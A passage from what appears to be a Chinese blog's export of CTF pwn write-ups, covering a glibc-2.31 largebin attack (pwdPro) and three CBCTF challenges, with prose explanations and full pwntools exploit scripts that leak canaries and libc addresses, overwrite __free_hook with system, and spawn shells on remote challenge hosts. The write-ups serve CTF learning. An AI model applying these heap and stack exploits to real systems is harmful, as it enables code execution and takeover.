class="line">add(&#x27;0&#x27;,0xf8,&#x27;0\n&#x27;)#0,7,8~12</span><br><span class="line"></span><br><span class="line">    add(&#x27;13&#x27;,0xf8,&#x27;1\n&#x27;)#13</span><br><span class="line">    show(1)</span><br><span class="line">    io.recvuntil(&#x27;Pwd is: &#x27;)</span><br><span class="line">    malloc_hook=(u64(io.recv(8))^key)-96-16</span><br><span class="line">    libc_base=malloc_hook-libc.symbols[&#x27;__malloc_hook&#x27;]</span><br><span class="line">    print(&#x27;libc_base&#x27;,hex(libc_base))</span><br><span class="line">    free_hook=libc_base+libc.symbols[&#x27;__free_hook&#x27;]</span><br><span class="line">    system=libc_base+libc.symbols[&#x27;system&#x27;]</span><br><span class="line"></span><br><span class="line">    add(&#x27;14&#x27;,0x38,&#x27;14\n&#x27;)#14</span><br><span class="line">    dele(14)</span><br><span class="line">    edit(1,p64((free_hook-8)))</span><br><span class="line">    add(&#x27;14&#x27;,0x38,&#x27;14\n&#x27;)</span><br><span class="line">    add(&#x27;15&#x27;,0x38,(p64(0x68732f6e69622f^key))+p64((system)^key)+&#x27;\n&#x27;)</span><br><span class="line">    #gdb.attach(io)</span><br><span class="line">    dele(15)</span><br><span class="line">    io.interactive()</span><br><span class="line">exp()</span><br></pre></td></tr></table></figure><h3 id="pwdPro（glibc-2-31下的largebin-attack）"><a href="#pwdPro（glibc-2-31下的largebin-attack）" class="headerlink" title="pwdPro（glibc-2.31下的largebin attack）"></a>pwdPro（glibc-2.31下的largebin attack）</h3><p>这道题就很有意思了，我们先回顾一下libc-2.26以下的largebin attack的操作，由于largebin中是按照大小存放的，假设我们的largebin chunk的大小满足在其中的largebin chunk的大小之间，那么其插入操作就是将它自己的fd和bk指针分别指向两边chunk的位置，然后更小chunk的bk指针和更大chunk的fd指针指向插入其中间的chunk；fd_nextsize,bk_nextsize指针的操作和fd，bk相似。其代码如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">[...]</span><br><span class="line"></span><br><span class="line">          else</span><br><span class="line">          &#123;</span><br><span class="line">              #victim为要插入的largrbin chunk，fwd为更小的largebin chunk</span><br><span class="line">              victim-&gt;fd_nextsize = fwd;</span><br><span class="line">              victim-&gt;bk_nextsize = fwd-&gt;bk_nextsize;</span><br><span class="line">              fwd-&gt;bk_nextsize = victim;</span><br><span class="line">              victim-&gt;bk_nextsize-&gt;fd_nextsize = victim;</span><br><span class="line">          &#125;</span><br><span class="line">          bck = fwd-&gt;bk;#这里代表着只能更改更小chunk的bk指针</span><br><span class="line"></span><br><span class="line">[...]</span><br><span class="line"></span><br><span class="line">mark_bin (av, victim_index);</span><br><span class="line">victim-&gt;bk = bck;</span><br><span class="line">victim-&gt;fd = fwd;</span><br><span class="line">fwd-&gt;bk = victim;</span><br><span class="line">bck-&gt;fd = victim;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>因此我们改变<strong>更小chunk</strong>的bk和bk_nextsize指针，再插入一个更大的largebin chunk，就可以修改任意地址的值（但不能指定值）。</p><p>由于libc-2.30增加了两个新的保护，如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">if (__glibc_unlikely (fwd-&gt;bk_nextsize-&gt;fd_nextsize != fwd))</span><br><span class="line">    malloc_printerr (&quot;malloc(): largebin double linked list corrupted (nextsize)&quot;);</span><br><span class="line">if (bck-&gt;fd != fwd)</span><br><span class="line">    malloc_printerr (&quot;malloc(): largebin double linked list corrupted (bk)&quot;);</span><br></pre></td></tr></table></figure><p>绕过方法为：(p1)malloc(0x428);malloc(0x18);(p2)malloc(0x418);malloc(0x18);free(p1);malloc(0x438);free(p2);malloc(0x438);即可绕过，原因是如果插入的largebin chunk是最小的，那么便不会检查bk_nextsize。</p><p>因为程序只允许我们申请大于0x400的chunk，因此我们可以想到像修改global_max_fast一样的方法，在有tcache的加入后我们可以修改tcache_max_bin，是的我们释放的largebin chunk都可以放入tcache中。那么tcache_max_bin该如何寻找呢，如下图：</p><p><img src="/2021/09/03/xiangyuncup/image-20210904111952666.png" class="lazyload placeholder" data-srcset="/2021/09/03/xiangyuncup/image-20210904111952666.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20210904111952666"></p><p>0x40代表着index，index=size(malloc(size))/0x10 - 1,将其值改为一个较大的数即可</p><p>完整exp：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">io = process(&#x27;./pwdPro&#x27;,env=&#123;&#x27;LD_PRELOAD&#x27;:&#x27;./libc.so&#x27;&#125;)</span><br><span class="line">#io = remote(&#x27;47.104.71.220&#x27; ,49261)</span><br><span class="line">libc = ELF(&#x27;./libc.so&#x27;)</span><br><span class="line">context.log_level = &#x27;debug&#x27;</span><br><span class="line"></span><br><span class="line">def add(index,name,length,context):</span><br><span class="line">    io.sendlineafter(&#x27;Choice:\n&#x27;,&#x27;1&#x27;)</span><br><span class="line">    io.sendlineafter(&#x27;You Want Add:\n&#x27;,str(index))</span><br><span class="line">    io.sendlineafter(&#x27;ID You Want Save:&#x27;,name)</span><br><span class="line">    io.sendlineafter(&#x27;Length Of Your Pwd:&#x27;,str(length))</span><br><span class="line">    io.sendafter(&#x27;Your Pwd:&#x27;,context)</span><br><span class="line"></span><br><span class="line">def edit(index,context):</span><br><span class="line">    io.sendlineafter(&#x27;Choice:\n&#x27;,&#x27;2&#x27;)</span><br><span class="line">    io.sendlineafter(&#x27;You Want Edit:\n&#x27;,str(index))</span><br><span class="line">    io.send(context)</span><br><span class="line"></span><br><span class="line">def show(index):</span><br><span class="line">    io.sendlineafter(&#x27;Choice:\n&#x27;,&#x27;3&#x27;)</span><br><span class="line">    io.sendlineafter(&#x27;You Want Check:\n&#x27;,str(index))</span><br><span class="line"></span><br><span class="line">def dele(index):</span><br><span class="line">    io.sendlineafter(&#x27;Choice:\n&#x27;,&#x27;4&#x27;)</span><br><span class="line">    io.sendlineafter(&#x27; Delete:\n&#x27;,str(index))</span><br><span class="line">    </span><br><span class="line">def re(index):</span><br><span class="line">    io.sendlineafter(&#x27;Choice:\n&#x27;,&#x27;5&#x27;)</span><br><span class="line">    io.sendlineafter(&#x27;Recover:\n&#x27;,str(index))</span><br><span class="line"></span><br><span class="line">def exp():</span><br><span class="line">    add(0,&#x27;0&#x27;,0x448,&#x27;0\n&#x27;)#0</span><br><span class="line">    io.recvuntil(&#x27;Save ID:&#x27;)</span><br><span class="line">    io.recv(8)</span><br><span class="line">    key=u64(io.recv(8))</span><br><span class="line">    print(&#x27;key&#x27;,hex(key))</span><br><span class="line">    add(1,&#x27;1&#x27;,0x428,&#x27;1\n&#x27;)#1</span><br><span class="line">    add(2,&#x27;2&#x27;,0x438,&#x27;2\n&#x27;)#2</span><br><span class="line">    add(3,&#x27;3&#x27;,0x428,&#x27;3\n&#x27;)#3</span><br><span class="line">    dele(0)</span><br><span class="line">    re(0)</span><br><span class="line"></span><br><span class="line">    show(0)</span><br><span class="line">    io.recvuntil(&#x27;Pwd is: &#x27;)</span><br><span class="line">    malloc_hook=(u64(io.recv(8))^key)-96-16</span><br><span class="line">    print(hex(malloc_hook+96+16))</span><br><span class="line">    libc_base=malloc_hook-libc.symbols[&#x27;__malloc_hook&#x27;]</span><br><span class="line">    print(&#x27;libc_base&#x27;,hex(libc_base))</span><br><span class="line">    free_hook=libc_base+libc.symbols[&#x27;__free_hook&#x27;]</span><br><span class="line">    system=libc_base+libc.symbols[&#x27;system&#x27;]</span><br><span class="line">    addr = libc_base+0x1eb2d0</span><br><span class="line">    gdb.attach(io)   </span><br><span class="line">    add(4,&#x27;4&#x27;,0x458,&#x27;4\n&#x27;)#4</span><br><span class="line">    show(0)</span><br><span class="line">    io.recvuntil(&#x27;Pwd is: &#x27;)</span><br><span class="line">    io.recv(0x10)</span><br><span class="line">    heap_base=(u64(io.recv(8))^key)-0x280</span><br><span class="line">    print(&#x27;heap_base&#x27;,hex(heap_base))</span><br><span class="line">    dele(2)</span><br><span class="line">    </span><br><span class="line">    edit(0,p64((malloc_hook+96+16+0x3f0))+p64((malloc_hook+96+16+0x3f0))+p64(heap_base+0x280)+p64((addr-0x20))+&#x27;\n&#x27;)</span><br><span class="line">    add(5,&#x27;5&#x27;,0x458,&#x27;5\n&#x27;)#5</span><br><span class="line">    dele(5)</span><br><span class="line">    dele(4)</span><br><span class="line">    re(4)</span><br><span class="line">    edit(4,p64(free_hook-8)+&#x27;\n&#x27;)</span><br><span class="line">    add(6,&#x27;6&#x27;,0x458,&#x27;6\n&#x27;)#6</span><br><span class="line">    add(7,&#x27;7&#x27;,0x458,p64((0x68732f6e69622f)^key)+p64(system^key)+&#x27;\n&#x27;)</span><br><span class="line">    dele(7)</span><br><span class="line">    #gdb.attach(io) </span><br><span class="line">    io.interactive()</span><br><span class="line">exp()</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>CBCTFpwn</title>
      <link href="/2021/08/02/CBCTFpwn/"/>
      <url>/2021/08/02/CBCTFpwn/</url>
      
        <content type="html"><![CDATA[<h3 id="CBCTF-pwn-WP"><a href="#CBCTF-pwn-WP" class="headerlink" title="CBCTF pwn WP"></a>CBCTF pwn WP</h3><span id="more"></span><p><em>题目还行，第一次把pwn题a了，尽管只有三道题😁</em></p><h3 id="1-old-thing"><a href="#1-old-thing" class="headerlink" title="1.old_thing"></a>1.old_thing</h3><p>是个久违的栈题，首先必须通过这个检测函数，我一看不正是刚打过的总决赛的题嘛，在第16行有offbynull漏洞，会将<code>s2</code>的第一个字节覆盖为\x00，因而我们只需要撞出MD5加密后为30位的值，然后利用strcmp函数漏洞绕过，可以发送’168‘或’1a3‘等等绕过strcmp函数，绕过这个函数后，后面就是普通的栈溢出了。</p><p><img src="/2021/08/02/CBCTFpwn/image-20210802000932708.png" class="lazyload placeholder" data-srcset="/2021/08/02/CBCTFpwn/image-20210802000932708.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20210802000932708"></p><p>漏洞在read函数上，读入的字节数较多，造成溢出，因为有canary保护，所以我们先泄露canary，由ida可以看出s2距canary有0x18的距离，又canary的第一个字节是\x00，所以我们需要发送0x19个字节的垃圾数据覆盖这个\x00，使printf能够泄露出canary。</p><p><img src="/2021/08/02/CBCTFpwn/image-20210802002413373.png" class="lazyload placeholder" data-srcset="/2021/08/02/CBCTFpwn/image-20210802002413373.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20210802002413373"></p><p>得到canary，因又PIE保护，所以得先泄露代码段的基地址，而rbp正好有代码段地址，因而得到代码段基地址，最后将返回地址改为后门函数，在泄露代码段地址时，只有后三位16进制是不变的，所以需要爆破，的权限。</p><p>撞30位哈希值脚本：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">import hashlib</span><br><span class="line"></span><br><span class="line">def md5encry(data):</span><br><span class="line">    md5 = hashlib.md5()  # 应用MD5算法</span><br><span class="line">    md5.update(data.encode(&#x27;utf-8&#x27;))</span><br><span class="line">    md = int(md5.hexdigest(), 16)</span><br><span class="line">    return md</span><br><span class="line"></span><br><span class="line">for i in range(0,1000):</span><br><span class="line">    h1 = hex(md5encry(hex(i)[2:]))[2:]</span><br><span class="line">    if len(h1) != 0x20:</span><br><span class="line">        h1 = h1.rjust(0x20,&#x27;0&#x27;)</span><br><span class="line">        #print((h1))</span><br><span class="line">    if h1[0]==&#x27;0&#x27; and h1[1]==&#x27;0&#x27;:</span><br><span class="line">        print(h1)</span><br><span class="line">        print(hex(i))</span><br><span class="line">        break</span><br></pre></td></tr></table></figure><p>完整exp：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">#io = process(&#x27;./canary3&#x27;)</span><br><span class="line">#io = remote(&#x27;node4.buuoj.cn&#x27;,26031)</span><br><span class="line">context.log_level = &#x27;debug&#x27;</span><br><span class="line">context.terminal = [&#x27;tmux&#x27;,&#x27;splitw&#x27;,&#x27;-h&#x27;]</span><br><span class="line"></span><br><span class="line">def exp():</span><br><span class="line">    io.recvuntil(&#x27;username: &#x27;)</span><br><span class="line">    payload = &#x27;admin&#x27;</span><br><span class="line">    payload = payload.ljust(0x20,&#x27;\x00&#x27;)</span><br><span class="line">    io.send(payload)</span><br><span class="line">    io.recvuntil(&#x27;password: &#x27;)</span><br><span class="line">    payload = &#x27;168&#x27;</span><br><span class="line">    payload = payload.ljust(0x20,&#x27;\x00&#x27;)</span><br><span class="line">    gdb.attach(io)</span><br><span class="line">    io.send(payload)</span><br><span class="line">    io.sendlineafter(&#x27;3.exit\n&#x27;,&#x27;2&#x27;)</span><br><span class="line">    payload = &#x27;a&#x27;*0x19</span><br><span class="line">    #gdb.attach(io)</span><br><span class="line">    io.sendafter(&#x27;input:\n&#x27;,payload)</span><br><span class="line">    io.sendlineafter(&#x27;3.exit\n&#x27;,&#x27;1&#x27;)</span><br><span class="line">    #gdb.attach(io)</span><br><span class="line">    io.recvuntil(&#x27;a&#x27;*0x19)</span><br><span class="line">    canary = u64(io.recv(7).ljust(8,&#x27;\x00&#x27;))</span><br><span class="line">    canary = canary&lt;&lt;8</span><br><span class="line">    print(&#x27;canary&#x27;,hex(canary))</span><br><span class="line">    addr = u64(io.recv(6).ljust(8,&#x27;\x00&#x27;))</span><br><span class="line">    print(hex(addr))</span><br><span class="line">    addr = addr &gt;&gt; 16</span><br><span class="line">    addr = addr &lt;&lt; 16</span><br><span class="line">    addr = addr + 0x239f</span><br><span class="line">    print(hex(addr))</span><br><span class="line"></span><br><span class="line">    io.sendlineafter(&#x27;3.exit\n&#x27;,&#x27;2&#x27;)</span><br><span class="line">    payload = &#x27;a&#x27;*0x18 + p64(canary) + p64(0) + p64(addr)</span><br><span class="line">    io.sendafter(&#x27;input:\n&#x27;,payload)</span><br><span class="line">    io.sendlineafter(&#x27;3.exit\n&#x27;,&#x27;3&#x27;)</span><br><span class="line">    io.recvuntil(&#x27;it!\n&#x27;,timeout = 0.5)</span><br><span class="line">    io.sendline(&#x27;cat flag&#x27;)</span><br><span class="line">    io.recvuntil(&#x27;&#125;&#x27;)</span><br><span class="line">#exp()        </span><br><span class="line"></span><br><span class="line">i = 0</span><br><span class="line">while (i != 20):</span><br><span class="line">    try:</span><br><span class="line">        #io = process(&#x27;./canary3&#x27;)</span><br><span class="line">        io = remote(&#x27;node4.buuoj.cn&#x27;,26031)</span><br><span class="line">        exp()</span><br><span class="line">        i += 1</span><br><span class="line">    except:</span><br><span class="line">        i += 1</span><br><span class="line">        io.close()</span><br></pre></td></tr></table></figure><h3 id="2-realNoOutput"><a href="#2-realNoOutput" class="headerlink" title="2.realNoOutput"></a>2.realNoOutput</h3><p>将函数恢复得到如下，这个<code>qword_3560</code>的作用就是如果chunk指针小于这个地址，那么就会对上一步我们操作过的大于这个地址的chunk再一次进行操作；如果chunk指针大于这个地址，就对此chunk进行操作。</p><p><img src="/2021/08/02/CBCTFpwn/image-20210802100342867.png" class="lazyload placeholder" data-srcset="/2021/08/02/CBCTFpwn/image-20210802100342867.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20210802100342867"></p><p><img src="/2021/08/02/CBCTFpwn/image-20210802100724651.png" class="lazyload placeholder" data-srcset="/2021/08/02/CBCTFpwn/image-20210802100724651.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20210802100724651"></p><p>可以发现dele，edit，show都进行了判断操作，也就是说，如果操作的chunk地址小于第一个申请的chunk，那么就会对上一次操作过的chunk再一次操作。</p><p><img src="/2021/08/02/CBCTFpwn/image-20210802100807211.png" class="lazyload placeholder" data-srcset="/2021/08/02/CBCTFpwn/image-20210802100807211.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20210802100807211"></p><p><img src="/2021/08/02/CBCTFpwn/image-20210802100851039.png" class="lazyload placeholder" data-srcset="/2021/08/02/CBCTFpwn/image-20210802100851039.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20210802100851039"></p><p><img src="/2021/08/02/CBCTFpwn/image-20210802100909732.png" class="lazyload placeholder" data-srcset="/2021/08/02/CBCTFpwn/image-20210802100909732.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20210802100909732"></p><p>因此我们改如何让申请的chunk的地址小于第一次申请的chunk呢？发现可以申请10个chunk，但size被分配到的空间只能存放8个chunk的大小，因此size会溢出，我们只需要先申请0和1位置的chunk，再申请8和9位置的chunk就可以将0和1的chunk地址覆盖为size，就可以得到小于第一次申请的chunk因而可以重复利用chunk。</p><p><img src="/2021/08/02/CBCTFpwn/image-20210802102531583.png" class="lazyload placeholder" data-srcset="/2021/08/02/CBCTFpwn/image-20210802102531583.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20210802102531583"></p><p><img src="/2021/08/02/CBCTFpwn/image-20210802102555327.png" class="lazyload placeholder" data-srcset="/2021/08/02/CBCTFpwn/image-20210802102555327.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20210802102555327"></p><p>完整exp</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">#io = process(&#x27;./realNoOutput&#x27;)</span><br><span class="line">io = remote(&#x27;node4.buuoj.cn&#x27;,26345)</span><br><span class="line">elf = ELF(&#x27;./realNoOutput&#x27;)</span><br><span class="line">#libc = elf.libc</span><br><span class="line">libc = ELF(&#x27;./libc.so.6&#x27;)</span><br><span class="line">context.log_level = &#x27;debug&#x27;</span><br><span class="line">context.terminal = [&#x27;tmux&#x27;,&#x27;splitw&#x27;,&#x27;-h&#x27;]</span><br><span class="line"></span><br><span class="line">def add(a1,a2,a3):</span><br><span class="line">    io.sendline(&#x27;1&#x27;)</span><br><span class="line">    raw_input()</span><br><span class="line">    io.sendline(str(a1))</span><br><span class="line">    raw_input()</span><br><span class="line">    io.sendline(str(a2))</span><br><span class="line">    raw_input()</span><br><span class="line">    io.send(a3)</span><br><span class="line">    raw_input()</span><br><span class="line"></span><br><span class="line">def dele(a1):</span><br><span class="line">    io.sendline(&#x27;2&#x27;)</span><br><span class="line">    raw_input()</span><br><span class="line">    io.sendline(str(a1))</span><br><span class="line">    raw_input()</span><br><span class="line"></span><br><span class="line">def edit(a1,a2):</span><br><span class="line">    io.sendline(&#x27;3&#x27;)</span><br><span class="line">    raw_input()</span><br><span class="line">    io.sendline(str(a1))</span><br><span class="line">    raw_input()</span><br><span class="line">    io.send(a2)</span><br><span class="line">    raw_input()</span><br><span class="line"></span><br><span class="line">def show(a1):</span><br><span class="line">    io.sendline(&#x27;4&#x27;)</span><br><span class="line">    raw_input()</span><br><span class="line">    io.sendline(str(a1))</span><br><span class="line">    raw_input()</span><br><span class="line"></span><br><span class="line">def exp():</span><br><span class="line">    add(0,0x100,&#x27;a\x0a&#x27;)</span><br><span class="line">    add(1,0x100,&#x27;a\x0a&#x27;)</span><br><span class="line">    add(2,0x80,&#x27;a\x0a&#x27;)</span><br><span class="line">    add(3,0x80,&#x27;a\x0a&#x27;)</span><br><span class="line">    add(4,0x80,&#x27;a\x0a&#x27;)</span><br><span class="line">    add(5,0x100,&#x27;a\x0a&#x27;)</span><br><span class="line">    add(6,0x100,&#x27;a\x0a&#x27;)</span><br><span class="line">    add(7,0x100,&#x27;a\x0a&#x27;)</span><br><span class="line">    add(8,0x10,&#x27;a\x0a&#x27;)</span><br><span class="line">    add(9,0x10,&#x27;a\x0a&#x27;)</span><br><span class="line"></span><br><span class="line">    dele(3)</span><br><span class="line">    dele(2)</span><br><span class="line">    show(1)</span><br><span class="line">    heap_base = u64(io.recv(6).ljust(8,&#x27;\x00&#x27;)) - 0x580</span><br><span class="line">    print(&#x27;heap_base&#x27;,hex(heap_base))</span><br><span class="line"></span><br><span class="line">    add(2,0x80,&#x27;a\x0a&#x27;)</span><br><span class="line">    add(3,0x80,&#x27;a\x0a&#x27;)</span><br><span class="line">    edit(2,&#x27;a\x0a&#x27;)</span><br><span class="line">    payload = &#x27;a&#x27;*0x80 + p64(0) + p64(0x451)</span><br><span class="line">    edit(1,payload)</span><br><span class="line">    dele(3)</span><br><span class="line">    show(1)</span><br><span class="line">    malloc_hook = u64(io.recvuntil(&#x27;\x7f&#x27;)[1:].ljust(8,&#x27;\x00&#x27;)) - 96 - 0x10</span><br><span class="line">    libc_base = malloc_hook - libc.symbols[&#x27;__malloc_hook&#x27;]</span><br><span class="line">    print(&#x27;libc_base&#x27;,hex(libc_base))</span><br><span class="line"></span><br><span class="line">    free_hook = libc_base + libc.symbols[&#x27;__free_hook&#x27;]</span><br><span class="line">    system = libc_base + libc.symbols[&#x27;system&#x27;]</span><br><span class="line">    dele(4)</span><br><span class="line">    dele(2)</span><br><span class="line">    edit(1,p64(free_hook-0x10))</span><br><span class="line">    add(2,0x80,&#x27;/bin/sh\x00&#x27;*2)</span><br><span class="line">    add(4,0x80,&#x27;/bin/sh\x00&#x27;*2+p64(system))</span><br><span class="line">    dele(2)</span><br><span class="line">    io.interactive()</span><br><span class="line"></span><br><span class="line">exp()</span><br></pre></td></tr></table></figure><p><em>在做这个题的时候我遇到了一个问题就是因为edit这个功能中的read操作写入的大小是根据size[]来的所以将size[8]覆盖为chunk0的地址发现却不能读入。</em></p><h3 id="3-EasyHeap"><a href="#3-EasyHeap" class="headerlink" title="3.EasyHeap"></a>3.EasyHeap</h3><p>常规沙箱堆题，禁用了execve和mmap函数，保护全开。</p><p><img src="/2021/08/02/CBCTFpwn/image-20210802003402630.png" class="lazyload placeholder" data-srcset="/2021/08/02/CBCTFpwn/image-20210802003402630.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20210802003402630"></p><p>此题用了strdup()函数，相当于是malloc函数，但他是根据指针指向值的长度来分配内存的。因此我们可以通过输入一个大于字符串长度的值来进行堆溢出。</p><p><img src="/2021/08/02/CBCTFpwn/image-20210802095022988.png" class="lazyload placeholder" data-srcset="/2021/08/02/CBCTFpwn/image-20210802095022988.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20210802095022988"></p><p>因为程序在0x23330000的位置开辟了块可读可写可执行的空间，所以我们将shellcode写入这里，在利用__free_hook将程序流劫持到shellcode的地方执行shellcode拿到权限。</p><p>完整exp</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span 